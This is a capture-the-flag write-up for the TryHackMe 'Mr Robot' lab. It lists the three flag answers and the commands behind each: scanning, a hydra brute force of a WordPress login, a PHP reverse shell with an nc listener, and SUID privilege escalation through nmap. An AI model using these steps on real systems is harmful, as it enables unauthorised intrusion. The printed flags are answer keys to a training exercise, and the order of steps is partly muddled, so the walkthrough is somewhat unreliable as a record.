
# <div align="center">[Mr Robot CTF](https://tryhackme.com/r/room/mrrobot)</div>
<div align="center">
<img src="https://github.com/user-attachments/assets/0b4d4b9c-feba-48dc-8665-347ffd05967b" height="200"></img>
</div>


## Task 1. Connect to our network
```
No need
```

## Task 2. Hack the machine

Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

Credit to Leon Johnson for creating this machine. This machine is used here with the explicit permission of the creator <3 

<div align="center">
<img src="https://github.com/user-attachments/assets/bed7ecc6-a979-4f07-bb89-26c1d971ad51" height="200"></img>
</div>

### Key 1
```
073403c8a58a1f80d943455fb30724b9
```
```
nmap -sC -sV -Pn <IP>
gobuster dir --url http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
http://<IP>/robots.txt
cat robots.txt
cat password.raw-md5
# abcdefghijklmnopqrstuvwxyz
su robot
cat key-1-of-3.txt
```
### Key 2
```
822c73956184f694993bede3eb39f959
```
```
http://<IP>/wp-login.php
hydra -L fsocity.dic -p 123453453 {IP} http-post-form “/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username”
http://<IP>/license
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
# elliot:ER28–0652
https://github.com/pentestmonkey/php-reverse-shell
nc -lnvp 4444
python -c ‘import pty;pty.spawn(“/bin/bash”)’
cat /home/robot/key-2-of-3.txt
```
### Key 3
```
04787ddef27c3dee1ee161b21670b4e4
```
```
sudo -l
find / -perm -u=s -type f 2>/dev/null
nmap --interactive
!sh
cat key-3-of-3.txt
```
```
04787ddef27c3dee1ee161b21670b4e4
```
